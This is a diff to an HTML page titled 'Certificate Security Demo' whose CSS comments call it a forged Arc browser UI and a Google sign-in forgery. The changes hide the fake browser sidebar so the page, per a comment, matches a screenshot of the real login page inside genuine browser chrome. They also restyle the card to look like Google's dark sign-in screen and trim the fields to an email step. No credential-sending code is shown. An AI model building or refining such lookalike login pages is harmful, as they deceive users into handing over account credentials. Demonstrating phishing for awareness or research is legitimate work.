@@ -5,442 +5,324 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Certificate Security Demo</title>
 
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html,
-        body {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family:
-                -apple-system,
-                BlinkMacSystemFont,
-                "Segoe UI",
-                Roboto,
-                Arial,
-                sans-serif;
-
-            background: #ffffff;
-            overflow: hidden;
-        }
-
-        /* =========================
-           INITIAL SCREEN
-        ========================= */
-
-        #start-screen {
-            width: 100vw;
-            height: 100vh;
-
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-
-            background: #ffffff;
-            color: #222;
-        }
-
-        #start-screen h2 {
-            margin: 0 0 20px;
-            font-size: 32px;
-        }
-
-        #start-screen ol {
-            line-height: 2;
-            font-size: 16px;
-            padding-left: 20px;
-        }
-
-
-        /* =========================
-           LOG
-        ========================= */
-
-        #log {
-            position: fixed;
-            left: 10px;
-            bottom: 10px;
-
-            opacity: 0;
-
-            pointer-events: none;
-
-            z-index: 99999999;
-        }
-
-
-        /* =========================
-           FULLSCREEN DEMO (FORGED ARC UI)
-        ========================= */
-
-        #demo-browser {
-            display: none;
-
-            position: fixed;
-            inset: 0;
-
-            width: 100vw;
-            height: 100vh;
-
-            background: #020617;
-
-            z-index: 999999;
-        }
-
-        .ui {
-            display: flex;
-            width: 100%;
-            height: 100%;
-        }
-
-
-        /* ===== SIDEBAR ===== */
-
-        .sidebar {
-            max-width: 390px;
-            width: 280px;
-            min-width: 280px;
-            flex-shrink: 0;
-            height: 100%;
-
-            background: radial-gradient(circle at 20% 0%, #0b1f3a, #020617 70%);
-            color: #e5e7eb;
-            padding: 16px;
-
-            display: flex;
-            flex-direction: column;
-            overflow-y: auto;
-
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-
-        .topbar {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 14px;
-        }
-
-        .icon {
-            width: 28px;
-            height: 28px;
-            opacity: .7;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .address-bar {
-            background: rgba(255, 255, 255, .08);
-            border-radius: 20px;
-            padding: 16px 18px;
-            font-size: 16px;
-            color: #cbd5e1;
-            margin-bottom: 18px;
-        }
-
-        .quick {
-            display: flex;
-            gap: 14px;
-            margin-bottom: 22px;
-        }
-
-        .app {
-            flex: 1;
-            height: 64px;
-            border-radius: 20px;
-            background: rgba(255, 255, 255, .06);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-        }
-
-        .app img {
-            width: 30px;
-            height: 30px;
-            object-fit: contain;
-        }
-
-        .space {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #9ca3af;
-            font-size: 16px;
-        }
-
-        .divider {
-            height: 1px;
-            background: rgba(255, 255, 255, .08);
-            margin: 12px 0;
-        }
-
-        .item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 8px;
-            font-size: 17px;
-            color: #cbd5e1;
-        }
-
-        .tab {
-            background: rgba(255, 255, 255, .08);
-            border-radius: 14px;
-        }
-
-        .tab img {
-            width: 18px;
-            height: 18px;
-        }
-
-        .footer {
-            margin-top: auto;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .footer img {
-            width: 26px;
-            height: 26px;
-            opacity: .8;
-        }
-
-
-        /* ===== CONTENT (GOOGLE SIGN-IN FORGERY) ===== */
-
-        :root {
-            --bg: #0f1115;
-            --card: #131314;
-            --border: #5f6368;
-            --border-focus: #8ab4f8;
-            --text: #e3e3e3;
-            --text-dim: #c4c7c5;
-            --link: #8ab4f8;
-            --btn: #a8c7fa;
-            --btn-text: #062e6f;
-            --radius: 28px;
-        }
-
-        .ct {
-            flex: 1;
-            overflow-y: auto;
-            background: var(--bg);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 24px;
-        }
-
-        .shell {
-            width: 100%;
-            max-width: 920px;
-        }
-
-        .card-dark {
-            background: var(--card);
-            border-radius: var(--radius);
-            padding: 48px 40px 36px;
-        }
-
-        .glogo {
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-            background: #fff;
-            margin-bottom: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .glogo svg {
-            width: 28px;
-            height: 28px;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 48px;
-            align-items: start;
-        }
-
-        h1 {
-            font-size: 44px;
-            line-height: 1.15;
-            font-weight: 400;
-            letter-spacing: -.4px;
-            margin-bottom: 22px;
-            color: var(--text);
-        }
-
-        .lede {
-            font-size: 16px;
-            line-height: 1.55;
-            color: var(--text);
-            max-width: 34ch;
-        }
-
-        .field {
-            position: relative;
-            margin-bottom: 4px;
-        }
-
-        .field input {
-            width: 100%;
-            height: 56px;
-            padding: 0 15px;
-            background: transparent;
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            color: var(--text);
-            font-size: 16px;
-            font-family: inherit;
-            outline: none;
-        }
-
-        .field input:focus {
-            border: 2px solid var(--border-focus);
-            padding: 0 14px;
-        }
-
-        .field label {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #9aa0a6;
-            font-size: 16px;
-            pointer-events: none;
-            background: var(--card);
-            padding: 0 5px;
-            transition: .15s cubic-bezier(.4, 0, .2, 1);
-        }
-
-        .field input:focus + label,
-        .field input:not(:placeholder-shown) + label {
-            top: 0;
-            font-size: 12px;
-            transform: translateY(-50%);
-        }
-
-        .field input:focus + label {
-            color: var(--border-focus);
-        }
-
-        a {
-            color: var(--link);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        a:hover {
-            text-decoration: underline;
-        }
-
-        .forgot {
-            display: inline-block;
-            margin-top: 14px;
-        }
-
-        .guest {
-            margin-top: 44px;
-            font-size: 14px;
-            line-height: 1.6;
-            color: var(--text-dim);
-        }
-
-        .guest a {
-            display: block;
-            margin-top: 2px;
-        }
-
-        .actions {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            gap: 26px;
-            margin-top: 56px;
-        }
-
-        .ghost {
-            background: none;
-            border: 0;
-            color: var(--link);
-            font: 500 14px/1 inherit;
-            padding: 10px 8px;
-            border-radius: 20px;
-            cursor: pointer;
-        }
-
-        .ghost:hover {
-            background: rgba(138, 180, 248, .08);
-        }
-
-        .primary {
-            background: var(--btn);
-            color: var(--btn-text);
-            border: 0;
-            border-radius: 20px;
-            padding: 0 24px;
-            height: 40px;
-            font: 500 14px/1 inherit;
-            cursor: pointer;
-        }
-
-        .primary:hover {
-            filter: brightness(1.06);
-        }
-
-        footer {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 22px 40px 0;
-            font-size: 12px;
-        }
-
-        .lang {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: var(--text-dim);
-            font-size: 12px;
-        }
-
-        .lang select {
-            appearance: none;
-            background: transparent;
-            border: 0;
-            color: var(--text-dim);
-            font: 12px/1 inherit;
-            cursor: pointer;
-        }
-
-        .links {
-            display: flex;
-            gap: 34px;
-        }
-
-        .links a {
-            color: var(--text-dim);
-            font-size: 12px;
-            font-weight: 400;
-        }
-    </style>
+    
+<style>
+* {
+    box-sizing: border-box;
+}
+
+html, body {
+    width: 100%;
+    height: 100%;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: #202124;
+    color: #e8eaed;
+    overflow: hidden;
+}
+
+/* Initial instruction screen */
+#start-screen {
+    width: 100vw;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    background: #fff;
+    color: #202124;
+}
+
+#start-screen h2 {
+    margin: 0 0 20px;
+    font-size: 32px;
+}
+
+#start-screen ol {
+    line-height: 2;
+    font-size: 16px;
+    padding-left: 20px;
+}
+
+#log {
+    position: fixed;
+    left: 10px;
+    bottom: 10px;
+    opacity: 0;
+    pointer-events: none;
+    z-index: 99999999;
+}
+
+/* Demo page */
+#demo-browser {
+    display: none;
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #202124;
+    z-index: 999999;
+}
+
+.ui {
+    width: 100%;
+    height: 100%;
+}
+
+/* Hide the previous fake browser sidebar.
+   The supplied screenshot shows the login page itself,
+   with the real browser chrome outside the webpage. */
+.sidebar {
+    display: none !important;
+}
+
+.ct {
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background: #202124;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 28px;
+}
+
+.shell {
+    width: 100%;
+    max-width: 1190px;
+}
+
+.card-dark {
+    width: 100%;
+    min-height: 460px;
+    background: #0f0f0f;
+    border-radius: 28px;
+    padding: 44px 42px 38px;
+}
+
+.glogo {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 28px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: transparent;
+}
+
+.glogo svg {
+    width: 44px;
+    height: 44px;
+}
+
+.grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 74px;
+    align-items: start;
+}
+
+h1 {
+    margin: 0 0 20px;
+    color: #f1f3f4;
+    font-size: 43px;
+    line-height: 1.15;
+    font-weight: 400;
+    letter-spacing: -0.5px;
+}
+
+.lede {
+    max-width: 390px;
+    margin: 0;
+    color: #e8eaed;
+    font-size: 16px;
+    line-height: 1.55;
+}
+
+.field {
+    position: relative;
+    margin-bottom: 4px;
+}
+
+.field input {
+    width: 100%;
+    height: 64px;
+    padding: 0 16px;
+    background: transparent;
+    border: 1px solid #9aa0a6;
+    border-radius: 4px;
+    color: #e8eaed;
+    font-size: 17px;
+    font-family: inherit;
+    outline: none;
+}
+
+.field input:focus {
+    border: 2px solid #a8c7fa;
+    padding: 0 15px;
+}
+
+.field label {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #bdc1c6;
+    font-size: 16px;
+    pointer-events: none;
+    background: #0f0f0f;
+    padding: 0 5px;
+    transition: .15s cubic-bezier(.4, 0, .2, 1);
+}
+
+.field input:focus + label,
+.field input:not(:placeholder-shown) + label {
+    top: 0;
+    font-size: 12px;
+    transform: translateY(-50%);
+}
+
+.field input:focus + label {
+    color: #a8c7fa;
+}
+
+a {
+    color: #a8c7fa;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.forgot {
+    display: inline-block;
+    margin-top: 14px;
+}
+
+.guest {
+    margin-top: 42px;
+    font-size: 14px;
+    line-height: 1.6;
+    color: #bdc1c6;
+}
+
+.guest a {
+    display: inline;
+    margin-left: 4px;
+}
+
+.actions {
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+    gap: 26px;
+    margin-top: 48px;
+}
+
+.ghost {
+    background: none;
+    border: 0;
+    color: #a8c7fa;
+    font: 500 14px/1 Arial, Helvetica, sans-serif;
+    padding: 10px 8px;
+    border-radius: 20px;
+    cursor: pointer;
+}
+
+.ghost:hover {
+    background: rgba(168, 199, 250, .08);
+}
+
+.primary {
+    background: #a8c7fa;
+    color: #062e6f;
+    border: 0;
+    border-radius: 22px;
+    padding: 0 26px;
+    height: 48px;
+    font: 500 14px/1 Arial, Helvetica, sans-serif;
+    cursor: pointer;
+}
+
+.primary:hover {
+    filter: brightness(1.06);
+}
+
+footer {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 22px 40px 0;
+    font-size: 12px;
+}
+
+.lang {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #bdc1c6;
+    font-size: 12px;
+}
+
+.lang select {
+    appearance: none;
+    background: transparent;
+    border: 0;
+    color: #bdc1c6;
+    font: 12px/1 Arial, Helvetica, sans-serif;
+    cursor: pointer;
+}
+
+.links {
+    display: flex;
+    gap: 34px;
+}
+
+.links a {
+    color: #bdc1c6;
+    font-size: 12px;
+    font-weight: 400;
+}
+
+/* Responsive */
+@media (max-width: 760px) {
+    .ct {
+        align-items: flex-start;
+        padding: 20px;
+    }
+
+    .card-dark {
+        min-height: auto;
+        padding: 32px 26px;
+        border-radius: 22px;
+    }
+
+    .grid {
+        grid-template-columns: 1fr;
+        gap: 42px;
+    }
+
+    h1 {
+        font-size: 36px;
+    }
+
+    .lede {
+        max-width: none;
+    }
+
+    footer {
+        padding: 18px 10px 0;
+    }
+}
+</style>
+
 </head>
 
 
@@ -542,7 +424,7 @@
 
                             <section>
                                 <h1>Sign in</h1>
-                                <p class="lede">with your Google Account to continue to Arc. This account will be available to other Google apps in the browser.</p>
+                                <p class="lede">Use your Google Account</p>
                             </section>
 
                             <section>
@@ -550,10 +432,6 @@
                                     <div class="field">
                                         <input id="ident" type="text" placeholder=" " autocomplete="username">
                                         <label for="ident">Email or phone</label>
-                                    </div>
-                                    <div class="field">
-                                        <input id="passwd" type="password" placeholder=" " autocomplete="current-password">
-                                        <label for="passwd">Password</label>
                                     </div>
                                     <a class="forgot" href="#" onclick="return false">Forgot email?</a>
                                     <p class="guest">Not your computer? Use Guest mode to sign in privately.<a href="#" onclick="return false">Learn more about using Guest mode</a></p>
